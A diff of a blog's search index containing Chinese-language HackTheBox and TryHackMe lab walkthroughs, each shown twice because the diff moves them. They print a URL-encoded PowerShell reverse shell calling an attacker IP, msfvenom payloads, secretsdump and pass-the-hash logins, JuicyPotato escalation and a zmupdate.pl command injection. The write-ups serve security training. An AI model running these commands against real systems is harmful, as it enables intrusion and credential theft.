+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175</span><br></pre></td></tr></table></figure>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Abusing-DCSync"><a href="#Abusing-DCSync" class="headerlink" title="Abusing DCSync"></a>Abusing DCSync</h3><p>將 winpeas 打入主機 (利用 evil-winrm upload 指令)<br>發現 WSUS 資料裡存留了一位使用者的帳號密碼?!  </p>
+<p><img src="https://hackmd.io/_uploads/HJZRm5rSyx.png" alt="image">  </p>
+<p>同時使用 bloodhound 進行域掃描：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;fsmith&#x27;</span> -p <span class="string">&#x27;Thestrokes23&#x27;</span> -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 --zip</span><br></pre></td></tr></table></figure>
+<p>注意到 SVG_LOANMGR (就是剛剛的USER)，對主機有 DCSync  </p>
+<p><img src="https://hackmd.io/_uploads/Sk-t4cSBkl.png" alt="image">  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;EGOTISTICAL-BANK.LOCAL&#x27;</span>/<span class="string">&#x27;svc_loanmgr&#x27;</span>:<span class="string">&#x27;Moneymakestheworldgoround!&#x27;</span>@<span class="string">&#x27;EGOTISTICAL-BANK.LOCAL&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>獲得 Admin Hash 為 823452073d75b9d1cf70ebdf86c7f98e<br>再次以 evil-winrm 進行 PTH get shell  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175</span><br></pre></td></tr></table></figure>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>沒錯，我在打 HTB 的 AD 101 Track XD<br>今天刷了前三台，練了一下手感，接下來應該會變有趣(?)  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>AD</tag>
+        <tag>Active Directory</tag>
+        <tag>Windows</tag>
+        <tag>HackTheBox</tag>
+        <tag>DCSync</tag>
+        <tag>username-anarchy</tag>
       </tags>
   </entry>
   <entry>
@@ -3830,6 +3914,35 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Retro on TryHackMe</title>
+    <url>/2024/03/07/retro-thm/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>又是一台HARD<br>打ㄌ兩天才打下來的機器…<br>等等去弄專題owob  </p>
+<p>Victim’s IP : 10.10.233.57<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.233.57 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BJ2JpR8pT.png" alt="image"><br>port 80是一個web服務，port 3389開了RDP  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p>這邊我使用了<code>dirbuster</code>這項工具，因為<code>dirsearch</code>什麼都打不出來(<br><img src="https://hackmd.io/_uploads/S13mCAUp6.png" alt="image"><br>使用<code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>的文檔。<br>結果：<br><img src="https://hackmd.io/_uploads/HkFv0AU6T.png" alt="image"><br>發現路徑<code>/retro</code>，是一個wordpress服務。<br><img src="https://hackmd.io/_uploads/rkpwkywT6.png" alt="image"><br>真的挺retro的。  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="social-engineering"><a href="#social-engineering" class="headerlink" title="social engineering"></a>social engineering</h4><p>發現管理員<code>wade</code>的奇怪留言：<br><img src="https://hackmd.io/_uploads/Bk84kyvTp.png" alt="image"><br>推測是帳號密碼，以wade&#x2F;parzival登入wordpress管理頁面成功<br>另外，因為有開啟RDP服務，也去使用<code>xfreerdp</code>以及剛剛獲得的帳號密碼進行登入。  </p>
+<h4 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h4><p>利用剛剛拿到的帳號密碼登入成功。<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:wade /p:parzival /v:10.10.233.57 /dynamic-resolution</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/S1HvM1Ppa.png" alt="image"><br>RDP成功，拿到user.txt  </p>
+<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><p>因為拿到了wordpress管理員權限，往404.php塞入shell<br><img src="https://hackmd.io/_uploads/r1f2MJPTa.png" alt="image"><br>裝好後塞入reverseshell.com(<a href="https://www.revshells.com/">link here</a>)生成的powershell payload<br>url:<code>http://10.10.233.57/retro/wp-content/themes/90s-retro/404.php?shark=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20&quot;%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient(&#39;10.9.195.189&#39;%2C%205427)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%%20%7B0%7D%3B%24StreamWriter.Write(%24String%20%2B%20&#39;SHELL&gt;%20&#39;)%3B%24StreamWriter.Flush()%7DWriteToStream%20&#39;&#39;%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20%7B%24Command%20%3D%20(%5Btext.encoding%5D%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202&gt;%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20(%24Output)%7D%24StreamWriter.Close()&quot;</code><br>GET SHELL!!!<br><img src="https://hackmd.io/_uploads/HkZD71D6T.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>利用 <code>whoami /priv</code> 查詢使用者權限  </p>
+<p><img src="https://hackmd.io/_uploads/ByFdXkva6.png" alt="image"><br>有開啟<code>SeImpersonatePrivilege</code>權限，合理推測能使用提權工具 Juicy Potato做下一步攻擊。<br><strong>註：</strong><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a><br>利用<code>msfvenom</code>生成<code>exe</code> reverse shell<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=1004 -f exe -o ./x64winreverse.exe</span><br></pre></td></tr></table></figure>
+<p>透過剛剛的reverse shell在機器上安裝JuicyPotato.exe以及x64winreverse.exe<br>接著查詢對應的CLSID並一一嘗試：<br>(CLSID表：<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard</a>)<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./JuicyPotato.exe -t * -l 1004  -p x64winreverse.exe -c <span class="string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HkjwVJvTp.png" alt="image"><br>成功在監聽端口得到回應!!!  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次玩JuicyPotato，有趣XD  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>Windows</tag>
+        <tag>TryHackMe</tag>
+        <tag>JuicyPotato</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Return Oriented Program note</title>
     <url>/2023/10/29/rop1/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I had posted a note of pwn for beginners(<a href="https://wha13.github.io/2023/10/12/pwn-note/">link here</a>), and recently I’ve learned more about ROP, so here is this post~  </p>
@@ -3958,35 +4071,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>web3</tag>
         <tag>SECCON</tag>
         <tag>nodejs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Retro on TryHackMe</title>
-    <url>/2024/03/07/retro-thm/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>又是一台HARD<br>打ㄌ兩天才打下來的機器…<br>等等去弄專題owob  </p>
-<p>Victim’s IP : 10.10.233.57<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.233.57 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BJ2JpR8pT.png" alt="image"><br>port 80是一個web服務，port 3389開了RDP  </p>
-<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p>這邊我使用了<code>dirbuster</code>這項工具，因為<code>dirsearch</code>什麼都打不出來(<br><img src="https://hackmd.io/_uploads/S13mCAUp6.png" alt="image"><br>使用<code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>的文檔。<br>結果：<br><img src="https://hackmd.io/_uploads/HkFv0AU6T.png" alt="image"><br>發現路徑<code>/retro</code>，是一個wordpress服務。<br><img src="https://hackmd.io/_uploads/rkpwkywT6.png" alt="image"><br>真的挺retro的。  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="social-engineering"><a href="#social-engineering" class="headerlink" title="social engineering"></a>social engineering</h4><p>發現管理員<code>wade</code>的奇怪留言：<br><img src="https://hackmd.io/_uploads/Bk84kyvTp.png" alt="image"><br>推測是帳號密碼，以wade&#x2F;parzival登入wordpress管理頁面成功<br>另外，因為有開啟RDP服務，也去使用<code>xfreerdp</code>以及剛剛獲得的帳號密碼進行登入。  </p>
-<h4 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h4><p>利用剛剛拿到的帳號密碼登入成功。<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:wade /p:parzival /v:10.10.233.57 /dynamic-resolution</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/S1HvM1Ppa.png" alt="image"><br>RDP成功，拿到user.txt  </p>
-<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><p>因為拿到了wordpress管理員權限，往404.php塞入shell<br><img src="https://hackmd.io/_uploads/r1f2MJPTa.png" alt="image"><br>裝好後塞入reverseshell.com(<a href="https://www.revshells.com/">link here</a>)生成的powershell payload<br>url:<code>http://10.10.233.57/retro/wp-content/themes/90s-retro/404.php?shark=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20&quot;%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient(&#39;10.9.195.189&#39;%2C%205427)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%%20%7B0%7D%3B%24StreamWriter.Write(%24String%20%2B%20&#39;SHELL&gt;%20&#39;)%3B%24StreamWriter.Flush()%7DWriteToStream%20&#39;&#39;%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20%7B%24Command%20%3D%20(%5Btext.encoding%5D%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202&gt;%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20(%24Output)%7D%24StreamWriter.Close()&quot;</code><br>GET SHELL!!!<br><img src="https://hackmd.io/_uploads/HkZD71D6T.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>利用 <code>whoami /priv</code> 查詢使用者權限  </p>
-<p><img src="https://hackmd.io/_uploads/ByFdXkva6.png" alt="image"><br>有開啟<code>SeImpersonatePrivilege</code>權限，合理推測能使用提權工具 Juicy Potato做下一步攻擊。<br><strong>註：</strong><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a><br>利用<code>msfvenom</code>生成<code>exe</code> reverse shell<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=1004 -f exe -o ./x64winreverse.exe</span><br></pre></td></tr></table></figure>
-<p>透過剛剛的reverse shell在機器上安裝JuicyPotato.exe以及x64winreverse.exe<br>接著查詢對應的CLSID並一一嘗試：<br>(CLSID表：<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard</a>)<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./JuicyPotato.exe -t * -l 1004  -p x64winreverse.exe -c <span class="string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HkjwVJvTp.png" alt="image"><br>成功在監聽端口得到回應!!!  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次玩JuicyPotato，有趣XD  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>Windows</tag>
-        <tag>TryHackMe</tag>
-        <tag>JuicyPotato</tag>
       </tags>
   </entry>
   <entry>
@@ -4225,6 +4309,36 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Surveillance Write Up on HackTheBox</title>
+    <url>/2024/04/08/surveillance-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
+<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
+<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
+<p>彈到 port 1004 get shell  </p>
+<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
+<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
+<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
+<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
+<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
+<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
+<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
+<p>上網google找到這個command injection，照打：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>test_if_work</title>
     <url>/2024/05/22/test-if-work/</url>
     <content><![CDATA[<h1 id="WTH"><a href="#WTH" class="headerlink" title="WTH???"></a>WTH???</h1><p>Because I crushed my kali linux again…</p>
@@ -4256,36 +4370,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       <tags>
         <tag>life</tag>
         <tag>THJCC</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Surveillance Write Up on HackTheBox</title>
-    <url>/2024/04/08/surveillance-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
-<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
-<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
-<p>彈到 port 1004 get shell  </p>
-<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
-<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
-<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
-<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
-<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
-<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
-<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
-<p>上網google找到這個command injection，照打：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
